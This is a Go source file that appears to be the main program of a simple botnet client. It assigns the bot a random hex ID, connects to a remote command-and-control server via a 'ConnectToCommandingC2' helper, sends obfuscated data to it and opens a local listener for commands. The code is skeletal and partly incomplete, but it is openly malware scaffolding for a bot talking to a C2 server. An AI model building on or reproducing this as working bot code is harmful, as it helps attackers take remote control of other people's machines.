package main

import (
	cli "bot/communication/client"
	srv "bot/communication/server"
	msg "bot/message"
	"bufio"
	"bytes"
	"fmt"
	"io"
	r "math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (

	Msgsize    = 4096
	UidLength  = 16
	letterBytes = "0123456789abcdef"
	letterIdxBits = 6                    // 6 bits to represent a letter index
	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
)

var (
	wg  sync.WaitGroup
	O   msg.Bot
	src = r.NewSource(time.Now().UnixNano())
)

// generateRandomUid generates a random hexadecimal string
// of length 16 used to identify the bot
func generateRandomUid() []byte {
	sb := strings.Builder{}
	sb.Grow(UidLength)
	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
	for i, cache, remain := UidLength-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			sb.WriteByte(letterBytes[idx])
			i--
		}
		cache >>= letterIdxBits
		remain--
	}
	
	return sb.Bytes();
}

func messageInput(m string) []byte {
	for {
		fmt.Printf("%s -> ", m)
		in := bufio.NewReader(os.Stdin)
		
		line, err := in.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input")
			os.Exit(1)
		} else {
			return []byte(strings.TrimSuffix(line, "\n"));
		}
	};
}



func readCommands(conn net.Conn) (string, error) {
	defer conn.Close()
	
	reader := bufio.NewReader(conn)
	var buffer bytes.Buffer
	for {
		ba, isPrefix, err := reader.ReadLine()
		if err != nil {
			// if the error is an End Of File this is still good
			if err == io.EOF {
				break;
			}
			return "", err
		}
		buffer.Write(ba)
		if !isPrefix {
			break;
		}
	}
	return buffer.String(), nil;
}

func writeData(server net.Conn) () {
	for {
		O.Com.Data = messageInput("Data")
		O.Com.Command = []byte("");
		
		x, err := server.Write(O.ObfuscateData())
		if err != nil {
			return;
		} else {
			fmt.Println("Sent ", x, " bytes")
		}
	}
}

func tryConnect()() {
	var remoteServer net.Conn = cli.ConnectToCommandingC2()
	if remoteServer != nil {
		defer remoteServer.Close()
	} else {
		return;
	}
	writeData(remoteServer)
}

func main() () {
	O.Uid = generateRandomUid()
	
	wg.Add(1)
	go tryConnect()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		
		var listener net.Listener = srv.StartLocalServer()
		defer listener.Close()
		
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		fmt.Println("Accepted connection from ", conn.RemoteAddr())
		readCommands(conn)
	}()
	
	wg.Wait();
}


// https://blog.jbowen.dev/2019/09/the-magic-of-go-comments/
